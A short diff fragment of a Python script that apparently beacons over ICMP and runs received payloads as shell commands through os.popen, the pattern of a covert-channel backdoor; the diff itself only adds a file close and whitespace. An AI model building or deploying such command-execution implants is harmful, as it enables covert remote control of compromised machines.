@@ -56,6 +56,9 @@ def beac_n_listen():
                             if pkt:
                                 if pkt[0][ICMP].seq == curr_seq:
                                     break
+                file.close()
+            
+
             else:
                 res = os.popen(payload).read()
                 curr_seq = 1
@@ -89,11 +92,6 @@ def beac_n_listen():
                 
 
 
-                
-
-
-
-
 def main():
     beac_n_listen()
      
@@ -108,3 +106,4 @@ if __name__ == "__main__":
 
 
  
+
